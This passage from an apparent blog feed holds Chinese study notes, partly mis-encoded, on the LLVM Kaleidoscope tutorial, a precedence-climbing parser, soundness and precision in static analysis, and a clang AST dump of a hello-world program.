<p>The call to <code>FunctionType::get</code> creates the <code>FunctionType</code> that should be used for a given Prototype. Since all function arguments in Kaleidoscope are of type double, the first line creates a vector of â€œNâ€ LLVM double types. It then uses the <code>Functiontype::get</code> method to create a function type that takes â€œNâ€ doubles as arguments, <strong>returns one double as a result</strong>, and that is not vararg (the false parameter indicates this). Note that Types in LLVM are uniqued just like Constants are, so you donâ€™t â€œnewâ€ a type, you â€œgetâ€ it.</p>
</blockquote>
<p>å¾ä¸­æˆ‘å¹¶æ²’æœ‰çœ‹å‡ºå“ªè£è¿”å›äº† doubleï¼Œæˆ‘çš„ç†è§£æ˜¯è¿”å›å€¼æ˜¯å¦æ˜¯ double æ‡‰è©²æ˜¯åœ¨å‡½æ•¸çš„ expression ä¸­çµ¦å®šçš„ï¼Œæ‰€ä»¥å°æ–¼é€™å€‹ï¼ˆFunctionType::getï¼‰å°±æ²’æœ‰æŒ‡å®šè¿”å›å€¼æ˜¯ double é¡å‹ã€‚</p>
<p>åªè¦çµ¦æ¯å€‹ AST åŠ ä¸€å€‹ codegen å‡½æ•¸å°±å¯ä»¥æ¯”è¼ƒæ–¹ä¾¿çš„ç”Ÿæˆ LLVM IR çš„ ASTï¼Œä½†æ˜¯å°æ–¼å…¶ä¸­çš„ <code>id</code>ï¼Œ<code>number</code>ï¼Œ<code>binary_expression</code>ï¼Œ<code>function</code>ï¼Œ<code>call</code>ï¼Œ<code>prototype</code> éœ€è¦å®šç¾©èˆ‡ LLVM IR çš„è½‰æ›ã€‚<del>èª¬å¯¦è©±æˆ‘æ²’ææ‡‚çˆ²ä»€éº½è¦ç”¨é€™éº½å¤šå’Œå‡½æ•¸æœ‰é—œçš„ AST</del></p>
<p>å…¶ä¸­æœ‰æ¯”è¼ƒé‡è¦çš„å¹¾å€‹å…¨å±€è®Šé‡</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>LLVMContext<span class="token operator">></span> TheContext<span class="token punctuation">;</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>IRBuilder<span class="token operator">&lt;</span><span class="token operator">>></span> Builder<span class="token punctuation">;</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> TheModule<span class="token punctuation">;</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>map<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>string<span class="token punctuation">,</span> Value <span class="token operator">*</span><span class="token operator">></span> NamedValues<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸å¤ªå¥½æè¿°é€™å¹¾å€‹çš„å¯¦éš›å«ç¾©ï¼Œ<code>TheContext</code> é¡ä¼¼æ–¼ LLVM IR çš„ this æŒ‡é‡ï¼Œ<code>Builder</code> ç”¨ä¾†æ§‹å»º LLVM IRï¼Œ<code>TheModule</code> ç”¨ä¾†æ§‹å»ºåŸºæœ¬å¡Šï¼Œ<code>NameValues</code> å­˜å„²å…¨å±€çš„æ•¸æ“šçµæ§‹ï¼Œæ¯”å¦‚ç¬¦è™Ÿè¡¨ä»€éº½çš„ã€‚</p>
<p><strong>ä»¥ä¸Šå¯«çš„å¯èƒ½åˆæœ‰äº›å•é¡Œï¼Œæˆ‘éä¸€æ®µæ™‚é–“å›æŸ¥ä¸€ä¸‹</strong></p>
<p>åƒè€ƒè³‡æ–™</p>
<ul>
<li><a href="https://llvm.org/docs/LangRef.html">LLVM IR reference</a></li>
<li><a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl03.html">https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl03.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>è¡¥å……ç¬”è®°</title>
    <url>/2023/09/23/%E6%95%A3%E8%A8%98-10-6-23/</url>
    <content><![CDATA[<h1 id="About-Sound-amp-Preciseï¼Ÿ"><a href="#About-Sound-amp-Preciseï¼Ÿ" class="headerlink" title="About Sound &amp; Preciseï¼Ÿ"></a>About Sound &amp; Preciseï¼Ÿ</h1><h2 id="å¯èƒ½å­˜åœ¨çš„åè¯"><a href="#å¯èƒ½å­˜åœ¨çš„åè¯" class="headerlink" title="å¯èƒ½å­˜åœ¨çš„åè¯"></a>å¯èƒ½å­˜åœ¨çš„åè¯</h2><ul>
<li>sound</li>
</ul>
<p>èƒ½å¤Ÿè·å–æ‰€æœ‰çš„åŠ¨æ€ä¿¡æ¯çš„åˆ†æç§°ä¸º sound</p>
<ul>
<li>soundy</li>
</ul>
<p>æƒ³è¦è·å–å®Œæ•´çš„åŠ¨æ€ä¿¡æ¯ï¼Œå¯¹äºä¸€äº›ä¸å¥½å¤„ç†çš„è¯­è¨€ç‰¹æ€§è¿›è¡Œåˆç†çš„å¤„ç†</p>
<ul>
<li>unsound</li>
</ul>
<p>â€œå¼€æ‘†â€ï¼Œç›´æ¥å¿½ç•¥ä¸€äº›ä¸å¥½å¤„ç†çš„è¯­è¨€ç‰¹æ€§ï¼Œä»¥æé«˜æ•ˆç‡ï¼Œç²¾åº¦ç­‰</p>
<ul>
<li>precision</li>
</ul>
<p>ä¸ä¼šæŠ¥é”™è¯¯ä¿¡æ¯çš„åˆ†æå¯ä»¥ç§°ä¹‹ä¸º precision</p>
<h2 id="ç°çŠ¶"><a href="#ç°çŠ¶" class="headerlink" title="ç°çŠ¶"></a>ç°çŠ¶</h2><p>é™æ€åˆ†æåœ¨è½¯ä»¶å¼€å‘ï¼Œç¼–è¯‘å™¨ï¼Œå®‰å…¨ç ”ç©¶ç­‰åœ°æ–¹ä½¿ç”¨å¹¿æ³›ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†çš„å®é™…ä¸­çš„é™æ€åˆ†æè½¯ä»¶ä¸èƒ½åšåˆ° soundã€‚ä»–ä»¬å¾ˆæœ‰å¯èƒ½å¿½ç•¥äº†ç±»ä¼¼åå°„ç­‰ä¸€äº›å¤æ‚çš„è¯­è¨€ç‰¹æ€§ã€‚</p>
<p>ä¹‹æ‰€ä»¥è¿™ä¹ˆåšæ˜¯å› ä¸ºè½¯ä»¶å¼€å‘è€…å¦¥åäº†ï¼Œå¦‚æœä¸ºäº† soundly é€‚é…å„ç§è¯­è¨€ç‰¹æ€§ï¼Œé™æ€åˆ†æå™¨å°±å¾ˆæœ‰å¯èƒ½å¤±å» imprecisionï¼Œæˆ–è€…éš¾ä»¥ç§»æ¤ï¼Œç”šè‡³æ ¹æœ¬ç”¨ä¸äº†ã€‚</p>
<p>å‚è€ƒ</p>
<ul>
<li>å—å¤§çš„é™æ€åˆ†æè¯¾ç¨‹ <a href="https://tai-e.pascal-lab.net/lectures.html">https://tai-e.pascal-lab.net/lectures.html</a></li>
<li>Soundiness Home Page <a href="http://soundiness.org/">http://soundiness.org/</a></li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>Notes</tag>
        <tag>Static Analysis</tag>
        <tag>vulnerability mining</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM å­¸ç¿’ç¬”è®°</title>
    <url>/2023/09/23/%E6%95%A3%E8%A8%98-9-23-23/</url>
    <content><![CDATA[<h1 id="LLVM-å­¸ç¿’"><a href="#LLVM-å­¸ç¿’" class="headerlink" title="LLVM å­¸ç¿’"></a>LLVM å­¸ç¿’</h1><p>ä»Šå¤©+ç¬¬äºŒå¤©æ—©ä¸Šå®Œæˆäº†<br><a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl01.html">https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl01.html</a><br><a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl02.html">https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/LangImpl02.html</a></p>
<p>å„…æˆ‘è¡¨é¢ä¸Šæ˜ç™½äº†è©æ³•åˆ†æèˆ‡èªæ³•åˆ†æï¼Œå¯«å‡ºä¾†çš„çš„ä»£ç¢¼å»éå¸¸æ··äº‚ã€‚</p>
<p>æ€è€ƒäº†ä¸€ä¸‹ï¼Œç™¼ç¾æˆ‘éå¸¸å®¹æ˜“ç–å¿½äº<strong>ä»€éº½æ™‚å€™æ‡‰è©²gettok</strong>ï¼Œ<strong>ç•°å¸¸è™•ç†ï¼Œè§£æåæœ‰å•é¡Œçš„åœ°æ–¹æ‡‰è©²è¿”å›nullptr</strong>ï¼Œ<strong>æ‡‰è©²ç”¨ä»€éº½æ¨£çš„ä»£ç¢¼è™•ç†ç”¢ç”Ÿå¼</strong>ã€‚</p>
<p>æœ€å¾Œå¯«å‡ºä¾†ä»£ç¢¼é‚„æ˜¯å’Œæä¾›çš„ä»£ç¢¼æ²’ä»€éº½å·®åˆ¥ï¼Œåœ¨æŸäº›åœ°æ–¹å°å­—ç¬¦ä¸²çš„è§£æå¹¶ä¸å®Œå…¨ã€‚</p>
<p>è²¼ä¸€ä¸‹æˆ‘èªçˆ²éå¸¸ç²¾å¦™çš„ä»£ç¢¼</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Parse oprhs::(op primary)*</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>ExprAST<span class="token operator">></span> <span class="token function">ParseBinOpRHS</span><span class="token punctuation">(</span><span class="token keyword">int</span> ExprPrec<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>ExprAST<span class="token operator">></span> LHS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">auto</span> TokPrec <span class="token operator">=</span> <span class="token function">GetTokenPrecedence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>TokPrec <span class="token operator">&lt;</span> ExprPrec<span class="token punctuation">)</span> 
            <span class="token keyword">return</span> LHS<span class="token punctuation">;</span>
        
        <span class="token keyword">char</span> BinOp <span class="token operator">=</span> CurTok<span class="token punctuation">;</span>
        <span class="token function">getNextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">auto</span> RHS <span class="token operator">=</span> <span class="token function">ParsePrimary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RHS<span class="token punctuation">)</span> 
            <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>

        <span class="token keyword">auto</span> NextPrec <span class="token operator">=</span> <span class="token function">GetTokenPrecedence</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>TokPrec <span class="token operator">&lt;</span> NextPrec<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            RHS <span class="token operator">=</span> <span class="token function">ParseBinOpRHS</span><span class="token punctuation">(</span>TokPrec<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>RHS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RHS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        LHS <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>BinaryExprAST<span class="token operator">></span></span></span><span class="token punctuation">(</span>BinOp<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>LHS<span class="token punctuation">)</span><span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>RHS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// Parse expression::primary oprhs</span>
<span class="token keyword">static</span> std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>ExprAST<span class="token operator">></span> <span class="token function">ParseExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">auto</span> LHS <span class="token operator">=</span> <span class="token function">ParsePrimary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>LHS<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">ParseBinOpRHS</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>LHS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ExprPrec çš„å¾©ç”¨ï¼Œæ—¢å¯ä»¥æª¢æ¸¬æ˜¯å¦è¡¨é”å¼åˆ°é”æœ«å°¾ï¼Œåˆå¯ä»¥æª¢æ¸¬ä¸‹ä¸€å€‹é‹ç®—ç¬¦å„ªå…ˆç´šæ˜¯å¦æ¯”ç•¶å‰çš„å„ªå…ˆç´šé«˜ã€‚ç•¶é‡åˆ°å„ªå…ˆç´šè¼ƒé«˜çš„é‹ç®—ç¬¦åï¼Œæˆ‘å€‘å¯ä»¥é€šéå°éæ­¸åœ°å° RHS è™•ç†ï¼Œé‡åˆ°ç¨ä½æ–¼é«˜å„ªå…ˆç´šçš„è¡¨é”å¼çš„æ™‚å€™è¿”å›é€™å€‹ RHSï¼Œå¾è€Œå¯¦ç¾æœ€å·¦æ¨å°ã€‚å¦å‰‡ç›´æ¥æŠŠæ•´å€‹ RHS è™•ç†å®Œå°±é•èƒŒäº† è‡ªé ‚å‘ä¸‹çš„ LL(1) çš„åŸå‰‡äº†ã€‚</p>
<p>æ˜å¤©å°‡é€²å…¥æ¿€å‹•äººå¿ƒçš„ LLVM-IR</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM å­¸ç¿’ç¬”è®°</title>
    <url>/2023/09/22/%E6%95%A3%E8%A8%98-9-22-23/</url>
    <content><![CDATA[<h1 id="LLVM-å­¸ç¿’"><a href="#LLVM-å­¸ç¿’" class="headerlink" title="LLVM å­¸ç¿’"></a>LLVM å­¸ç¿’</h1><p>LLVM å…¨ç¨±æ˜¯ Low Level Virtual Machineï¼Œé–‹å§‹æ™‚é‚„ä¸å¤ªç†è§£ LLVM åˆ°åº•æœ‰å•¥ç”¨ï¼Œçˆ²ä»€éº½é€™éº½å¥½ç”¨ã€‚</p>
<p>è¡†æ‰€å‘¨çŸ¥ gcc ä¹Ÿå¯ä»¥åŠƒåˆ†çˆ²ç›¸æ‡‰çš„ å‰ç«¯ ä¸­ç«¯ å¾Œç«¯ã€‚çˆ²ä»€éº½ gcc æ²’æœ‰ llvm æ€éº½å¥½ç”¨ï¼Œå¯è¦‹ llvm çš„çµæ§‹è¨­è¨ˆçš„æ¯”è¼ƒå„ªç§€ï¼Œéå¸¸é©åˆä»£ç¢¼ reuseã€‚æŠŠ AST ç­‰ IR åšäº†éš”é›¢ï¼Œè®“æˆ‘å€‘å¯ä»¥éå¸¸æ–¹ä¾¿çš„åˆ©ç”¨ IR åšä¸€äº›å·¥ä½œã€‚</p>
<p><del>æ¥ä¸‹ä¾†æˆ‘æ‰“ç®—å¾å‰ç«¯é–‹å§‹å­¸ç¿’ LLVM çš„æºç¢¼ã€‚</del> æˆ‘èªçˆ²ï¼ˆæ›¸ä¸Šå¯«çš„ï¼‰é‚„æ˜¯å…ˆè©¦ä¸€ä¸‹é€™å€‹ reuse çš„ç‰¹æ€§ã€‚To be honestï¼Œä¹‹å‰å¹¶æ²’æœ‰å­¸é cmakeï¼Œé‡åˆ°å•é¡Œäº†ï¼ŒåŸºæœ¬ä¹Ÿåªæ˜¯åœ¨æºä»£ç¢¼çš„ä¸Šé¢é€²è¡Œä¸€é»ä¿®æ”¹ï¼Œä¸¦ä¸éœ€è¦æŒæ¡é€™å€‹èƒ½åŠ›ï¼Œè¶ç¾åœ¨æˆ‘å€‘ä¹Ÿå¯ä»¥å­¸ç¿’éå›ºä¸€ç•ªç›¸é—œçš„çŸ¥è­˜ã€‚</p>
<p>ä»Šå¤©ä¸çŸ¥é“çˆ²ä»€éº½æ•ˆç‡æœ‰ä¸€é»ä½ï¼Œå¯èƒ½æ—©ä¸Šè¢« 4 ç¯€æ€æ”¿èª²æŠ˜ç£¨çš„ç·£æ•…ï¼Œä¸‹åˆå°±çœ‹äº†æœƒå…’æ¼«ç•«æ‰“äº†æœƒéµé“ï¼Œæ™šä¸Šå†åƒä¸€å€‹è‚¯çˆºçˆºï¼ˆéµé“å‘¨é‚Šï¼‰ï¼Œç©¿æ’ä¸€äº› b ç«™çŸ­è¦–é »ã€‚æœ‰ä¸€çµ²çµ²ç½ªæƒ¡æ„Ÿã€‚</p>
<p>æ™šä¸Šç¨å¾®å° AST é€²è¡Œäº†ä¸€é»æ€è€ƒï¼ŒLLVM çˆ²ä»€éº½è¦æŠŠè«¸å¦‚ â€œè©æ³•åˆ†æâ€ â€œèªæ³•åˆ†æâ€ â€èªç¾©åˆ†æâ€œ é€²è¡Œä¸€å®šçš„æŠ½é›¢ï¼Œåªæ˜¯çˆ²äº†ä»£ç¢¼å¾©ç”¨å—ï¼Œæ—¢ç„¶è¦ä»£ç¢¼å¾©ç”¨ï¼Œä»–çš„ç›®çš„æ˜¯ä»€éº½å‘¢ï¼Œå¦‚æœæ²’æœ‰ä»£ç¢¼å¾©ç”¨çš„å¿…è¦ï¼Œå¿…ç„¶æ²’æœ‰æ‹†é›¢çš„å¿…è¦ã€‚é€™ä¹Ÿè¨±å¯ä»¥éƒ¨åˆ†è§£é‡‹ä¹‹å‰ GCC çˆ²ä»€éº½æ²’æœ‰é€™æ¨£è¨­è¨ˆã€‚ä¹Ÿå°±æ˜¯èª¬ï¼Œè©æ³•åˆ†æå¾Œçš„ Tokenï¼Œèªæ³•åˆ†ææ¨¹ã€ä¸‰åœ°å€ä»£ç¢¼ã€æŠ½è±¡èªæ³•æ¨¹ç­‰ä¸­é–“è¡¨ç¤ºï¼ˆIRï¼‰æ˜¯æœ‰å„è‡ªçš„ç‰¹é»ï¼ˆå„ªé»&#x2F;ç¼ºé»çš„ï¼‰ï¼Œå¦‚ä½•çµåˆå„è‡ªçš„å„ªç¼ºé»é€²è¡Œå·¥ä½œï¼Œä¹Ÿè¨±æ˜¯éå¸¸å€¼å¾—ç ”ç©¶çš„æ–¹å‘ã€‚</p>
<p>çˆ²äº†ç†Ÿæ‚‰ ASTï¼Œæˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹ llvm çš„ AST æ˜¯æ€éº½æ¨£çš„</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">\\ hello<span class="token punctuation">.</span>c
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> k <span class="token operator">=</span> i<span class="token operator">+</span>j<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello wolrd %d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>clang -target riscv64 -march=rv64g -Xclang -ast-dump -fsyntax-only hello.c</code></p>
<p>å…¶ä¸­ -Xclang è¡¨ç¤ºæŠŠå¾Œé¢çš„åƒæ•¸å‚³çµ¦ clang å‰ç«¯ï¼Œ-ast-dump æ‰“å°å‡ºæŠ½è±¡èªæ³•æ¨¹ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token operator">|</span>-TypedefDecl 0x7527a8 <span class="token operator">&lt;&lt;</span>invalid sloc<span class="token operator">>></span> <span class="token operator">&lt;</span>invalid sloc<span class="token operator">></span> implicit __builtin_va_list <span class="token string">'void *'</span>
<span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-PointerType 0x71aa10 <span class="token string">'void *'</span>
<span class="token operator">|</span>   <span class="token variable">`</span></span>-BuiltinType 0x719ab0 <span class="token string">'void'</span>
<span class="token operator">|</span>-FunctionDecl 0x777bc8 <span class="token operator">&lt;</span>hello.c:3:1, line:7:<span class="token operator"><span class="token file-descriptor important">1</span>></span> line:3:5 main <span class="token string">'int ()'</span>
<span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-CompoundStmt 0x7782e8 <span class="token operator">&lt;</span>col:11, line:7:<span class="token operator"><span class="token file-descriptor important">1</span>></span>
<span class="token operator">|</span>   <span class="token operator">|</span>-DeclStmt 0x777f20 <span class="token operator">&lt;</span>line:4:5, col:3<span class="token operator"><span class="token file-descriptor important">0</span>></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-VarDecl 0x777cc8 <span class="token operator">&lt;</span>col:5, col:1<span class="token operator"><span class="token file-descriptor important">3</span>></span> col:9 used i <span class="token string">'int'</span> cinit
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable">`</span></span>-IntegerLiteral 0x777d30 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">3</span>></span> <span class="token string">'int'</span> <span class="token number">0</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-VarDecl 0x777d68 <span class="token operator">&lt;</span>col:5, col:2<span class="token operator"><span class="token file-descriptor important">0</span>></span> col:16 used j <span class="token string">'int'</span> cinit
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-IntegerLiteral 0x777dd0 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">0</span>></span> <span class="token string">'int'</span> <span class="token number">3</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token variable">`</span></span>-VarDecl 0x777e08 <span class="token operator">&lt;</span>col:5, col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> col:23 used k <span class="token string">'int'</span> cinit
<span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-BinaryOperator 0x777ee0 <span class="token operator">&lt;</span>col:27, col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token string">'int'</span> <span class="token string">'+'</span>
<span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>-ImplicitCastExpr 0x777eb0 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">7</span>></span> <span class="token string">'int'</span> <span class="token operator">&lt;</span>LValueToRValue<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token variable">`</span></span>-DeclRefExpr 0x777e70 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">7</span>></span> <span class="token string">'int'</span> lvalue Var 0x777cc8 <span class="token string">'i'</span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token variable"><span class="token variable">`</span>-ImplicitCastExpr 0x777ec8 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token string">'int'</span> <span class="token operator">&lt;</span>LValueToRValue<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span>       <span class="token variable">`</span></span>-DeclRefExpr 0x777e90 <span class="token operator">&lt;</span>col:2<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token string">'int'</span> lvalue Var 0x777d68 <span class="token string">'j'</span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token operator">|</span>-CallExpr 0x778240 <span class="token operator">&lt;</span>line:5:5, col:3<span class="token operator"><span class="token file-descriptor important">3</span>></span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-ImplicitCastExpr 0x778228 <span class="token operator">&lt;</span>col:<span class="token operator"><span class="token file-descriptor important">5</span>></span> <span class="token string">'int (*)(const char *, ...)'</span> <span class="token operator">&lt;</span>FunctionToPointerDecay<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable"><span class="token variable">`</span>-DeclRefExpr 0x778118 <span class="token operator">&lt;</span>col:<span class="token operator"><span class="token file-descriptor important">5</span>></span> <span class="token string">'int (const char *, ...)'</span> Function 0x777f78 <span class="token string">'printf'</span> <span class="token string">'int (const char *, ...)'</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>-ImplicitCastExpr 0x778288 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'const char *'</span> <span class="token operator">&lt;</span>NoOp<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token variable">`</span></span>-ImplicitCastExpr 0x778270 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'char *'</span> <span class="token operator">&lt;</span>ArrayToPointerDecay<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-StringLiteral 0x778178 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'char[16]'</span> lvalue <span class="token string">"hello wolrd %d<span class="token entity" title="\n">\n</span>"</span>
<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token variable">`</span></span>-ImplicitCastExpr 0x7782a0 <span class="token operator">&lt;</span>col:3<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'int'</span> <span class="token operator">&lt;</span>LValueToRValue<span class="token operator">></span>
<span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token variable"><span class="token variable">`</span>-DeclRefExpr 0x7781a0 <span class="token operator">&lt;</span>col:3<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'int'</span> lvalue Var 0x777e08 <span class="token string">'k'</span> <span class="token string">'int'</span>
<span class="token operator">|</span>   <span class="token variable">`</span></span>-ReturnStmt 0x7782d8 <span class="token operator">&lt;</span>line:6:5, col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span>
<span class="token operator">|</span>     <span class="token variable"><span class="token variable">`</span>-IntegerLiteral 0x7782b8 <span class="token operator">&lt;</span>col:1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token string">'int'</span> <span class="token number">0</span>
<span class="token variable">`</span></span>-FunctionDecl 0x777f78 <span class="token operator">&lt;</span>line:5:<span class="token operator"><span class="token file-descriptor important">5</span>></span> col:5 implicit used <span class="token builtin class-name">printf</span> <span class="token string">'int (const char *, ...)'</span> extern
  <span class="token operator">|</span>-ParmVarDecl 0x778070 <span class="token operator">&lt;&lt;</span>invalid sloc<span class="token operator">>></span> <span class="token operator">&lt;</span>invalid sloc<span class="token operator">></span> <span class="token string">'const char *'</span>
  <span class="token operator">|</span>-BuiltinAttr 0x778018 <span class="token operator">&lt;&lt;</span>invalid sloc<span class="token operator">>></span> Implicit <span class="token number">824</span>
  `-FormatAttr 0x7780e0 <span class="token operator">&lt;</span>col:<span class="token operator"><span class="token file-descriptor important">5</span>></span> Implicit <span class="token builtin class-name">printf</span> <span class="token number">1</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

